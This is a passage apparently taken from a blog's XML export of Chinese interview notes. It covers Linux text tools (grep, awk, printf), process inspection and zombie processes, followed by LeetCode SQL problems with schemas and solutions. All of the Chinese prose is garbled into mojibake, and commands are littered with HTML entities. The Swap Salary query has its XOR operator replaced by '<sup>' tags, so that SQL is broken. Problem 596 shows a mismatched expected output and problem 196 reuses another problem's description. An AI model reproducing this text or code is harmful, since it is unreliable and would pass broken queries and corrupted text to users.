æœå¯»å­—ç¬¦ä¸² å†…å®¹çš„é‚£ä¸€è¡Œ--color=auto ï¼šæ‰¾åˆ°çš„å…³é”®å­—åŠ é¢œè‰²æ˜¾ç¤º ç¤ºä¾‹ï¼šæŠŠå«æœ‰ the å­—ç¬¦ä¸²çš„è¡Œæå–å‡ºæ¥ï¼ˆæ³¨æ„é»˜è®¤ä¼šæœ‰ â€“color=auto é€‰é¡¹ï¼Œå› æ­¤ä»¥ä¸‹å†…å®¹åœ¨ Linux ä¸­æœ‰é¢œè‰²æ˜¾ç¤º the å­—ç¬¦ä¸²ï¼‰ 123456$ grep -n 'the' regular_express.txt8:I can't finish the test.12:the symbol '*' is represented as start.15:You are the best is mean you are the no. 1.16:The world Happy is the same with "glad".18:google is the best tools for search keyword å› ä¸º { å’Œ } åœ¨ shell æ˜¯æœ‰ç‰¹æ®Šæ„ä¹‰çš„ï¼Œå› æ­¤å¿…é¡»è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ 1$ grep -n 'go\&#123;2,5\&#125;g' regular_express.txt printfç”¨äºæ ¼å¼åŒ–è¾“å‡ºã€‚ å®ƒä¸å±äºç®¡é“å‘½ä»¤ï¼Œåœ¨ç»™ printf ä¼ æ•°æ®æ—¶éœ€è¦ä½¿ç”¨ $( ) å½¢å¼ã€‚ 1234$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awkæ˜¯ç”± Alfred Ahoï¼ŒPeter Weinberger, å’Œ Brian Kernighan åˆ›é€ ï¼Œawk è¿™ä¸ªåå­—å°±æ˜¯è¿™ä¸‰ä¸ªåˆ›å§‹äººåå­—çš„é¦–å­—æ¯ã€‚ awk æ¯æ¬¡å¤„ç†ä¸€è¡Œï¼Œå¤„ç†çš„æœ€å°å•ä½æ˜¯å­—æ®µï¼Œæ¯ä¸ªå­—æ®µçš„å‘½åæ–¹å¼ä¸ºï¼š\$nï¼Œn ä¸ºå­—æ®µå·ï¼Œä» 1 å¼€å§‹ï¼Œ\$0 è¡¨ç¤ºä¸€æ•´è¡Œã€‚ ç¤ºä¾‹ 1ï¼šå–å‡ºç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åå’Œ ip 12345678$ last -n 5dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged indmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)$ last -n 5 | awk '&#123;print $1 "\t" $3&#125; å¯ä»¥æ ¹æ®å­—æ®µçš„æŸäº›æ¡ä»¶è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚åŒ¹é…å­—æ®µå°äºæŸä¸ªå€¼çš„é‚£ä¸€è¡Œæ•°æ®ã€‚ 1$ awk 'æ¡ä»¶ç±»å‹ 1 &#123;åŠ¨ä½œ 1&#125; æ¡ä»¶ç±»å‹ 2 &#123;åŠ¨ä½œ 2&#125; ...' filename ç¤ºä¾‹ 2ï¼š/etc/passwd æ–‡ä»¶ç¬¬ä¸‰ä¸ªå­—æ®µä¸º UIDï¼Œå¯¹ UID å°äº 10 çš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚ 1234$ cat /etc/passwd | awk &apos;BEGIN &#123;FS=&quot;:&quot;&#125; $3 &lt; 10 &#123;print $1 &quot;\t &quot; $3&#125;&apos;root 0bin 1daemon 2 awk å˜é‡ï¼š å˜é‡åç§° ä»£è¡¨æ„ä¹‰ NF æ¯ä¸€è¡Œæ‹¥æœ‰çš„å­—æ®µæ€»æ•° NR ç›®å‰æ‰€å¤„ç†çš„æ˜¯ç¬¬å‡ è¡Œæ•°æ® FS ç›®å‰çš„åˆ†éš”å­—ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼é”® ç¤ºä¾‹ 3ï¼šè¾“å‡ºæ­£åœ¨å¤„ç†çš„è¡Œå·ï¼Œå¹¶æ˜¾ç¤ºæ¯ä¸€è¡Œæœ‰å¤šå°‘å­—æ®µ 123456$ last -n 5 | awk '&#123;print $1 "\t lines: " NR "\t columns: " NF&#125;'dmtsai lines: 1 columns: 10dmtsai lines: 2 columns: 10dmtsai lines: 3 columns: 10dmtsai lines: 4 columns: 10dmtsai lines: 5 columns: 9 åã€è¿›ç¨‹ç®¡ç†æŸ¥çœ‹è¿›ç¨‹1. psæŸ¥çœ‹æŸä¸ªæ—¶é—´ç‚¹çš„è¿›ç¨‹ä¿¡æ¯ ç¤ºä¾‹ä¸€ï¼šæŸ¥çœ‹è‡ªå·±çš„è¿›ç¨‹ 1# ps -l ç¤ºä¾‹äºŒï¼šæŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹ 1# ps aux ç¤ºä¾‹ä¸‰ï¼šæŸ¥çœ‹ç‰¹å®šçš„è¿›ç¨‹ 1# ps aux | grep threadx 2. topå®æ—¶æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ ç¤ºä¾‹ï¼šä¸¤ç§’é’Ÿåˆ·æ–°ä¸€æ¬¡ 1# top -d 2 3. pstreeæŸ¥çœ‹è¿›ç¨‹æ ‘ ç¤ºä¾‹ï¼šæŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹æ ‘ 1# pstree -A 4. netstatæŸ¥çœ‹å ç”¨ç«¯å£çš„è¿›ç¨‹ ç¤ºä¾‹ï¼šæŸ¥çœ‹ç‰¹å®šç«¯å£çš„è¿›ç¨‹ 1# netstat -anp | grep port è¿›ç¨‹çŠ¶æ€ çŠ¶æ€ è¯´æ˜ R running or runnable (on run queue) D uninterruptible sleep (usually I/O) S interruptible sleep (waiting for an event to complete) Z zombie (terminated but not reaped by its parent) T stopped (either by a job control signal or because it is being traced) SIGCHLDå½“ä¸€ä¸ªå­è¿›ç¨‹æ”¹å˜äº†å®ƒçš„çŠ¶æ€æ—¶ï¼šåœæ­¢è¿è¡Œï¼Œç»§ç»­è¿è¡Œæˆ–è€…é€€å‡ºï¼Œæœ‰ä¸¤ä»¶äº‹ä¼šå‘ç”Ÿåœ¨çˆ¶è¿›ç¨‹ä¸­ï¼š å¾—åˆ° SIGCHLD ä¿¡å·ï¼› waitpid() æˆ–è€… wait() è°ƒç”¨ä¼šè¿”å›ã€‚ å…¶ä¸­å­è¿›ç¨‹å‘é€çš„ SIGCHLD ä¿¡å·åŒ…å«äº†å­è¿›ç¨‹çš„ä¿¡æ¯ï¼ŒåŒ…å«äº†è¿›ç¨‹ IDã€è¿›ç¨‹çŠ¶æ€ã€è¿›ç¨‹ä½¿ç”¨ CPU çš„æ—¶é—´ç­‰ã€‚ åœ¨å­è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå®ƒçš„è¿›ç¨‹æè¿°ç¬¦ä¸ä¼šç«‹å³é‡Šæ”¾ï¼Œè¿™æ˜¯ä¸ºäº†è®©çˆ¶è¿›ç¨‹å¾—åˆ°å­è¿›ç¨‹ä¿¡æ¯ã€‚çˆ¶è¿›ç¨‹é€šè¿‡ wait() å’Œ waitpid() æ¥è·å¾—ä¸€ä¸ªå·²ç»é€€å‡ºçš„å­è¿›ç¨‹çš„ä¿¡æ¯ã€‚ wait()1pid_t wait(int *status) çˆ¶è¿›ç¨‹è°ƒç”¨ wait() ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æ”¶åˆ°ä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºçš„ SIGCHLD ä¿¡å·ï¼Œä¹‹å wait() å‡½æ•°ä¼šé”€æ¯å­è¿›ç¨‹å¹¶è¿”å›ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å›è¢«æ”¶é›†çš„å­è¿›ç¨‹çš„è¿›ç¨‹ IDï¼›å¦‚æœè°ƒç”¨è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œè°ƒç”¨å°±ä¼šå¤±è´¥ï¼Œæ­¤æ—¶è¿”å› -1ï¼ŒåŒæ—¶ errno è¢«ç½®ä¸º ECHILDã€‚ å‚æ•° status ç”¨æ¥ä¿å­˜è¢«æ”¶é›†çš„å­è¿›ç¨‹é€€å‡ºæ—¶çš„ä¸€äº›çŠ¶æ€ï¼Œå¦‚æœæˆ‘ä»¬å¯¹è¿™ä¸ªå­è¿›ç¨‹æ˜¯å¦‚ä½•æ­»æ‰çš„æ¯«ä¸åœ¨æ„ï¼Œåªæƒ³æŠŠè¿™ä¸ªå­è¿›ç¨‹æ¶ˆç­æ‰ï¼Œå¯ä»¥è®¾ç½®è¿™ä¸ªå‚æ•°ä¸º NULLï¼š 1pid = wait(NULL); waitpid()1pid_t waitpid(pid_t pid, int *status, int options) ä½œç”¨å’Œ wait() å®Œå…¨ç›¸åŒï¼Œä½†æ˜¯å¤šäº†ä¸¤ä¸ªå¯ç”±ç”¨æˆ·æ§åˆ¶çš„å‚æ•° pid å’Œ optionsã€‚ pid å‚æ•°æŒ‡ç¤ºä¸€ä¸ªå­è¿›ç¨‹çš„ IDï¼Œè¡¨ç¤ºåªå…³å¿ƒè¿™ä¸ªå­è¿›ç¨‹çš„é€€å‡º SIGCHLD ä¿¡å·ã€‚å¦‚æœ pid=-1 æ—¶ï¼Œé‚£ä¹ˆå’Œ wait() ä½œç”¨ç›¸åŒï¼Œéƒ½æ˜¯å…³å¿ƒæ‰€æœ‰å­è¿›ç¨‹é€€å‡ºçš„ SIGCHLD ä¿¡å·ã€‚ options å‚æ•°ä¸»è¦æœ‰ WNOHANG å’Œ WUNTRACED ä¸¤ä¸ªé€‰é¡¹ï¼ŒWNOHANG å¯ä»¥ä½¿ waitpid() è°ƒç”¨å˜æˆéé˜»å¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¼šç«‹å³è¿”å›ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œå…¶å®ƒä»»åŠ¡ã€‚ å­¤å„¿è¿›ç¨‹ä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆè¿™äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚ å­¤å„¿è¿›ç¨‹å°†è¢« init è¿›ç¨‹ï¼ˆè¿›ç¨‹å·ä¸º 1ï¼‰æ‰€æ”¶å…»ï¼Œå¹¶ç”± init è¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚ ç”±äºå­¤å„¿è¿›ç¨‹ä¼šè¢« init è¿›ç¨‹æ”¶å…»ï¼Œæ‰€ä»¥å­¤å„¿è¿›ç¨‹ä¸ä¼šå¯¹ç³»ç»Ÿé€ æˆå±å®³ã€‚ åƒµå°¸è¿›ç¨‹ä¸€ä¸ªå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦åœ¨å­è¿›ç¨‹é€€å‡ºæ—¶ä¸ä¼šé‡Šæ”¾ï¼Œåªæœ‰å½“çˆ¶è¿›ç¨‹é€šè¿‡ wait() æˆ– waitpid() è·å–äº†å­è¿›ç¨‹ä¿¡æ¯åæ‰ä¼šé‡Šæ”¾ã€‚å¦‚æœå­è¿›ç¨‹é€€å‡ºï¼Œè€Œçˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨ wait() æˆ– waitpid()ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä»ç„¶ä¿å­˜åœ¨ç³»ç»Ÿä¸­ï¼Œè¿™ç§è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµå°¸è¿›ç¨‹ã€‚ åƒµå°¸è¿›ç¨‹é€šè¿‡ ps å‘½ä»¤æ˜¾ç¤ºå‡ºæ¥çš„çŠ¶æ€ä¸º Zï¼ˆzombieï¼‰ã€‚ ç³»ç»Ÿæ‰€èƒ½ä½¿ç”¨çš„è¿›ç¨‹å·æ˜¯æœ‰é™çš„ï¼Œå¦‚æœå¤§é‡çš„äº§ç”Ÿåƒµå°¸è¿›ç¨‹ï¼Œå°†å› ä¸ºæ²¡æœ‰å¯ç”¨çš„è¿›ç¨‹å·è€Œå¯¼è‡´ç³»ç»Ÿä¸èƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚ è¦æ¶ˆç­ç³»ç»Ÿä¸­å¤§é‡çš„åƒµå°¸è¿›ç¨‹ï¼Œåªéœ€è¦å°†å…¶çˆ¶è¿›ç¨‹æ€æ­»ï¼Œæ­¤æ—¶æ‰€æœ‰çš„åƒµå°¸è¿›ç¨‹å°±ä¼šå˜æˆå­¤å„¿è¿›ç¨‹ï¼Œä»è€Œè¢« init æ‰€æ”¶å…»ï¼Œè¿™æ · init å°±ä¼šé‡Šæ”¾æ‰€æœ‰çš„åƒµæ­»è¿›ç¨‹æ‰€å æœ‰çš„èµ„æºï¼Œä»è€Œç»“æŸåƒµå°¸è¿›ç¨‹ã€‚ å‚è€ƒèµ„æ–™ é¸Ÿå“¥. é¸Ÿ å“¥ çš„ Linux ç§ æˆ¿ èœ åŸº ç¡€ ç¯‡ ç¬¬ ä¸‰ ç‰ˆ[J]. 2009. Linux å¹³å°ä¸Šçš„è½¯ä»¶åŒ…ç®¡ç† Linux ä¹‹å®ˆæŠ¤è¿›ç¨‹ã€åƒµæ­»è¿›ç¨‹ä¸å­¤å„¿è¿›ç¨‹ What is the difference between a symbolic link and a hard link? Linux process states GUID Partition Table è¯¦è§£ wait å’Œ waitpid å‡½æ•° IDEã€SATAã€SCSIã€SASã€FCã€SSD ç¡¬ç›˜ç±»å‹ä»‹ç» Akai IB-301S SCSI Interface for S2800,S3000 Parallel ATA ADATA XPG SX900 256GB SATA 3 SSD Review â€“ Expanded Capacity and SandForce Driven Speed Decoding UCS Invicta â€“ Part 1 ç¡¬ç›˜ Difference between SAS and SATA BIOS File system design case studies Programming Project #4 FILE SYSTEM DESIGN]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-Database é¢˜è§£]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FLeetcode-Database%20%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[595. Big Countries 627. Swap Salary 620. Not Boring Movies 596. Classes More Than 5 Students 182. Duplicate Emails 196. Delete Duplicate Emails 175. Combine Two Tables 181. Employees Earning More Than Their Managers 183. Customers Who Never Order 184. Department Highest Salary 176. Second Highest Salary 177. Nth Highest Salary 178. Rank Scores 180. Consecutive Numbers 626. Exchange Seats 595. Big Countrieshttps://leetcode.com/problems/big-countries/description/ Description123456789+-----------------+------------+------------+--------------+---------------+| name | continent | area | population | gdp |+-----------------+------------+------------+--------------+---------------+| Afghanistan | Asia | 652230 | 25500100 | 20343000 || Albania | Europe | 28748 | 2831741 | 12960000 || Algeria | Africa | 2381741 | 37100000 | 188681000 || Andorra | Europe | 468 | 78115 | 3712000 || Angola | Africa | 1246700 | 20609294 | 100990000 |+-----------------+------------+------------+--------------+---------------+ æŸ¥æ‰¾é¢ç§¯è¶…è¿‡ 3,000,000 æˆ–è€…äººå£æ•°è¶…è¿‡ 25,000,000 çš„å›½å®¶ã€‚ 123456+--------------+-------------+--------------+| name | population | area |+--------------+-------------+--------------+| Afghanistan | 25500100 | 652230 || Algeria | 37100000 | 2381741 |+--------------+-------------+--------------+ SQL Schema1234567891011DROP TABLEIF EXISTS World;CREATE TABLE World ( NAME VARCHAR ( 255 ), continent VARCHAR ( 255 ), area INT, population INT, gdp INT );INSERT INTO World ( NAME, continent, area, population, gdp )VALUES ( 'Afghanistan', 'Asia', '652230', '25500100', '203430000' ), ( 'Albania', 'Europe', '28748', '2831741', '129600000' ), ( 'Algeria', 'Africa', '2381741', '37100000', '1886810000' ), ( 'Andorra', 'Europe', '468', '78115', '37120000' ), ( 'Angola', 'Africa', '1246700', '20609294', '1009900000' ); Solution12345678SELECT name, population, areaFROM WorldWHERE area &gt; 3000000 OR population &gt; 25000000; 627. Swap Salaryhttps://leetcode.com/problems/swap-salary/description/ Description123456| id | name | sex | salary ||----|------|-----|--------|| 1 | A | m | 2500 || 2 | B | f | 1500 || 3 | C | m | 5500 || 4 | D | f | 500 | åªç”¨ä¸€ä¸ª SQL æŸ¥è¯¢ï¼Œå°† sex å­—æ®µåè½¬ã€‚ 123456| id | name | sex | salary ||----|------|-----|--------|| 1 | A | f | 2500 || 2 | B | m | 1500 || 3 | C | f | 5500 || 4 | D | m | 500 | SQL Schema12345678910DROP TABLEIF EXISTS salary;CREATE TABLE salary ( id INT, NAME VARCHAR ( 100 ), sex CHAR ( 1 ), salary INT );INSERT INTO salary ( id, NAME, sex, salary )VALUES ( '1', 'A', 'm', '2500' ), ( '2', 'B', 'f', '1500' ), ( '3', 'C', 'm', '5500' ), ( '4', 'D', 'f', '500' ); Solution12UPDATE salarySET sex = CHAR ( ASCII(sex) &lt;sup&gt; ASCII( 'm' ) &lt;/sup&gt; ASCII( 'f' ) ); 620. Not Boring Movieshttps://leetcode.com/problems/not-boring-movies/description/ Description123456789+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 1 | War | great 3D | 8.9 || 2 | Science | fiction | 8.5 || 3 | irish | boring | 6.2 || 4 | Ice song | Fantacy | 8.6 || 5 | House card| Interesting| 9.1 |+---------+-----------+--------------+-----------+ æŸ¥æ‰¾ id ä¸ºå¥‡æ•°ï¼Œå¹¶ä¸” description ä¸æ˜¯ boring çš„ç”µå½±ï¼ŒæŒ‰ rating é™åºã€‚ 123456+---------+-----------+--------------+-----------+| id | movie | description | rating |+---------+-----------+--------------+-----------+| 5 | House card| Interesting| 9.1 || 1 | War | great 3D | 8.9 |+---------+-----------+--------------+-----------+ SQL Schema1234567891011DROP TABLEIF EXISTS cinema;CREATE TABLE cinema ( id INT, movie VARCHAR ( 255 ), description VARCHAR ( 255 ), rating FLOAT ( 2, 1 ) );INSERT INTO cinema ( id, movie, description, rating )VALUES ( 1, 'War', 'great 3D', 8.9 ), ( 2, 'Science', 'fiction', 8.5 ), ( 3, 'irish', 'boring', 6.2 ), ( 4, 'Ice song', 'Fantacy', 8.6 ), ( 5, 'House card', 'Interesting', 9.1 ); Solution123456789SELECT *FROM cinemaWHERE id % 2 = 1 AND description != 'boring'ORDER BY rating DESC; 596. Classes More Than 5 Studentshttps://leetcode.com/problems/classes-more-than-5-students/description/ Description12345678910111213+---------+------------+| student | class |+---------+------------+| A | Math || B | English || C | Math || D | Biology || E | Math || F | Computer || G | Math || H | Math || I | Math |+---------+------------+ æŸ¥æ‰¾æœ‰äº”ååŠä»¥ä¸Š student çš„ classã€‚ 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schema123456789101112131415DROP TABLEIF EXISTS courses;CREATE TABLE courses ( student VARCHAR ( 255 ), class VARCHAR ( 255 ) );INSERT INTO courses ( student, class )VALUES ( 'A', 'Math' ), ( 'B', 'English' ), ( 'C', 'Math' ), ( 'D', 'Biology' ), ( 'E', 'Math' ), ( 'F', 'Computer' ), ( 'G', 'Math' ), ( 'H', 'Math' ), ( 'I', 'Math' ); Solution12345678SELECT classFROM coursesGROUP BY classHAVING count( DISTINCT student ) &gt;= 5; 182. Duplicate Emailshttps://leetcode.com/problems/duplicate-emails/description/ Descriptioné‚®ä»¶åœ°å€è¡¨ï¼š 1234567+----+---------+| Id | Email |+----+---------+| 1 | a@b.com || 2 | c@d.com || 3 | a@b.com |+----+---------+ æŸ¥æ‰¾é‡å¤çš„é‚®ä»¶åœ°å€ï¼š 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schema123456789DROP TABLEIF EXISTS Person;CREATE TABLE Person ( Id INT, Email VARCHAR ( 255 ) );INSERT INTO Person ( Id, Email )VALUES ( 1, 'a@b.com' ), ( 2, 'c@d.com' ), ( 3, 'a@b.com' ); Solution12345678SELECT EmailFROM PersonGROUP BY EmailHAVING COUNT( * ) &gt;= 2; 196. Delete Duplicate EmailsDescriptioné‚®ä»¶åœ°å€è¡¨ï¼š 1234567+----+---------+| Id | Email |+----+---------+| 1 | a@b.com || 2 | c@d.com || 3 | a@b.com |+----+---------+ æŸ¥æ‰¾é‡å¤çš„é‚®ä»¶åœ°å€ï¼š 12345+---------+| Email |+---------+| a@b.com |+---------+ SQL Schemaä¸ 182 ç›¸åŒã€‚ Solutionè¿æ¥ï¼š 1234567DELETE p1FROM Person p1, Person p2WHERE p1.Email = p2.Email AND p1.Id &gt; p2.Id å­æŸ¥è¯¢ï¼š 12345DELETEFROM PersonWHERE id NOT IN ( SELECT id FROM ( SELECT min( id ) AS id FROM Person GROUP BY email ) AS m ); åº”è¯¥æ³¨æ„çš„æ˜¯ä¸Šè¿°è§£æ³•é¢å¤–åµŒå¥—äº†ä¸€ä¸ª SELECT è¯­å¥ï¼Œå¦‚æœä¸è¿™ä¹ˆåšï¼Œä¼šå‡ºç°é”™è¯¯ï¼šYou canâ€™t specify target table â€˜Personâ€™ for update in FROM clauseã€‚ä»¥ä¸‹æ¼”ç¤ºäº†è¿™ç§é”™è¯¯è§£æ³•ã€‚ 12345DELETEFROM PersonWHERE id NOT IN ( SELECT min( id ) AS id FROM Person GROUP BY email ); å‚è€ƒï¼špMySQL Error 1093 - Canâ€™t specify target table for update in FROM clause 175. Combine Two Tableshttps://leetcode.com/problems/combine-two-tables/description/ DescriptionPerson è¡¨ï¼š 12345678+-------------+---------+| Column Name | Type |+-------------+---------+| PersonId | int || FirstName | varchar || LastName | varchar |+-------------+---------+PersonId is the primary key column for this table. Address è¡¨ï¼š 123456789+-------------+---------+| Column Name | Type |+-------------+---------+| AddressId | int || PersonId | int || City | varchar || State | varchar |+-------------+---------+AddressId is the primary key column for this table. æŸ¥æ‰¾ FirstName, LastName, City, State æ•°æ®ï¼Œè€Œä¸ç®¡ä¸€ä¸ªç”¨æˆ·æœ‰æ²¡æœ‰å¡«åœ°å€ä¿¡æ¯ã€‚ SQL Schema1234567891011121314DROP TABLEIF EXISTS Person;CREATE TABLE Person ( PersonId INT, FirstName VARCHAR ( 255 ), LastName VARCHAR ( 255 ) );DROP TABLEIF EXISTS Address;CREATE TABLE Address ( AddressId INT, PersonId INT, City VARCHAR ( 255 ), State VARCHAR ( 255 ) );INSERT INTO Person ( PersonId, LastName, FirstName )VALUES ( 1, 'Wang', 'Allen' );INSERT INTO Address ( AddressId, PersonId, City, State )VALUES ( 1, 2, 'New York City', 'New York' ); Solutionä½¿ç”¨å·¦å¤–è¿æ¥ã€‚ 12345678SELECT FirstName, LastName, City, StateFROM Person P LEFT JOIN Address AS A ON P.PersonId = A.PersonId; 181. Employees Earning More Than Their Managershttps://leetcode.com/problems/employees-earning-more-than-their-managers/description/ DescriptionEmployee è¡¨ï¼š 12345678+----+-------+--------+-----------+| Id | Name | Salary | ManagerId |+----+-------+--------+-----------+| 1 | Joe | 70000 | 3 || 2 | Henry | 80000 | 4 || 3 | Sam | 60000 | NULL || 4 | Max | 90000 | NULL |+----+-------+--------+-----------+ æŸ¥æ‰¾æ‰€æœ‰å‘˜å·¥ï¼Œä»–ä»¬çš„è–ªèµ„å¤§äºå…¶ç»ç†è–ªèµ„ã€‚ SQL Schema12345678910DROP TABLEIF EXISTS Employee;CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, ManagerId INT );INSERT INTO Employee ( Id, NAME, Salary, ManagerId )VALUES ( 1, 'Joe', 70000, 3 ), ( 2, 'Henry', 80000, 4 ), ( 3, 'Sam', 60000, NULL ), ( 4, 'Max', 90000, NULL ); Solution123456SELECT E1.NAME AS EmployeeFROM Employee E1 INNER JOIN Employee E2 ON E1.ManagerId = E2.Id AND E1.Salary &gt; E2.Salary; 183. Customers Who Never Orderhttps://leetcode.com/problems/customers-who-never-order/description/ DescriptionCurstomers è¡¨ï¼š 12345678+----+-------+| Id | Name |+----+-------+| 1 | Joe || 2 | Henry || 3 | Sam || 4 | Max |+----+-------+ Orders è¡¨ï¼š 123456+----+------------+| Id | CustomerId |+----+------------+| 1 | 3 || 2 | 1 |+----+------------+ æŸ¥æ‰¾æ²¡æœ‰è®¢å•çš„é¡¾å®¢ä¿¡æ¯ï¼š 123456+-----------+| Customers |+-----------+| Henry || Max |+-----------+ SQL Schema123456789101112131415161718DROP TABLEIF EXISTS Customers;CREATE TABLE Customers ( Id INT, NAME VARCHAR ( 255 ) );DROP TABLEIF EXISTS Orders;CREATE TABLE Orders ( Id INT, CustomerId INT );INSERT INTO Customers ( Id, NAME )VALUES ( 1, 'Joe' ), ( 2, 'Henry' ), ( 3, 'Sam' ), ( 4, 'Max' );INSERT INTO Orders ( Id, CustomerId )VALUES ( 1, 3 ), ( 2, 1 ); Solutionå·¦å¤–é“¾æ¥ 1234567SELECT C.Name AS CustomersFROM Customers C LEFT JOIN Orders O ON C.Id = O.CustomerIdWHERE O.CustomerId IS NULL; å­æŸ¥è¯¢ 123456SELECT Name AS CustomersFROM CustomersWHERE Id NOT IN ( SELECT CustomerId FROM Orders ); 184. Department Highest Salaryhttps://leetcode.com/problems/department-highest-salary/description/ DescriptionEmployee è¡¨ï¼š 12345678+----+-------+--------+--------------+| Id | Name | Salary | DepartmentId |+----+-------+--------+--------------+| 1 | Joe | 70000 | 1 || 2 | Henry | 80000 | 2 || 3 | Sam | 60000 | 2 || 4 | Max | 90000 | 1 |+----+-------+--------+--------------+ Department è¡¨ï¼š 123456+----+----------+| Id | Name |+----+----------+| 1 | IT || 2 | Sales |+----+----------+ æŸ¥æ‰¾ä¸€ä¸ª Department ä¸­æ”¶å…¥æœ€é«˜è€…çš„ä¿¡æ¯ï¼š 123456+------------+----------+--------+| Department | Employee | Salary |+------------+----------+--------+| IT | Max | 90000 || Sales | Henry | 80000 |+------------+----------+--------+ SQL Schema1234567891011121314DROP TABLE IF EXISTS Employee;CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, DepartmentId INT );DROP TABLE IF EXISTS Department;CREATE TABLE Department ( Id INT, NAME VARCHAR ( 255 ) );INSERT INTO Employee ( Id, NAME, Salary, DepartmentId )VALUES ( 1, 'Joe', 70000, 1 ), ( 2, 'Henry', 80000, 2 ), ( 3, 'Sam', 60000, 2 ), ( 4, 'Max', 90000, 1 );INSERT INTO Department ( Id, NAME )VALUES ( 1, 'IT' ), ( 2, 'Sales' ); Solutionåˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨ï¼ŒåŒ…å«äº†éƒ¨é—¨å‘˜å·¥çš„æœ€å¤§è–ªèµ„ã€‚å¯ä»¥å¯¹éƒ¨é—¨è¿›è¡Œåˆ†ç»„ï¼Œç„¶åä½¿ç”¨ MAX() æ±‡æ€»å‡½æ•°å–å¾—æœ€å¤§è–ªèµ„ã€‚ ä¹‹åä½¿ç”¨è¿æ¥æ‰¾åˆ°ä¸€ä¸ªéƒ¨é—¨ä¸­è–ªèµ„ç­‰äºä¸´æ—¶è¡¨ä¸­æœ€å¤§è–ªèµ„çš„å‘˜å·¥ã€‚ 123456789101112SELECT D.NAME Department, E.NAME Employee, E.SalaryFROM Employee E, Department D, ( SELECT DepartmentId, MAX( Salary ) Salary FROM Employee GROUP BY DepartmentId ) MWHERE E.DepartmentId = D.Id AND E.DepartmentId = M.DepartmentId AND E.Salary = M.Salary; 176. Second Highest Salaryhttps://leetcode.com/problems/second-highest-salary/description/ Description1234567+----+--------+| Id | Salary |+----+--------+| 1 | 100 || 2 | 200 || 3 | 300 |+----+--------+ æŸ¥æ‰¾å·¥èµ„ç¬¬äºŒé«˜çš„å‘˜å·¥ã€‚ 12345+---------------------+| SecondHighestSalary |+---------------------+| 200 |+---------------------+ å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œé‚£ä¹ˆå°±è¿”å› null è€Œä¸æ˜¯ä¸è¿”å›æ•°æ®ã€‚ SQL Schema123456789DROP TABLEIF EXISTS Employee;CREATE TABLE Employee ( Id INT, Salary INT );INSERT INTO Employee ( Id, Salary )VALUES ( 1, 100 ), ( 2, 200 ), ( 3, 300 ); Solutionä¸ºäº†åœ¨æ²¡æœ‰æŸ¥æ‰¾åˆ°æ•°æ®æ—¶è¿”å› nullï¼Œéœ€è¦åœ¨æŸ¥è¯¢ç»“æœå¤–é¢å†å¥—ä¸€å±‚ SELECTã€‚ 12SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT 1, 1 ) SecondHighestSalary; 177. Nth Highest SalaryDescriptionæŸ¥æ‰¾å·¥èµ„ç¬¬ N é«˜çš„å‘˜å·¥ã€‚ SQL SchemaåŒ 176ã€‚ Solution123456CREATE FUNCTION getNthHighestSalary ( N INT ) RETURNS INT BEGINSET N = N - 1;RETURN ( SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N, 1 ) );END 178. Rank Scoreshttps://leetcode.com/problems/rank-scores/description/ Descriptionå¾—åˆ†è¡¨ï¼š 12345678910+----+-------+| Id | Score |+----+-------+| 1 | 3.50 || 2 | 3.65 || 3 | 4.00 || 4 | 3.85 || 5 | 4.00 || 6 | 3.65 |+----+-------+ 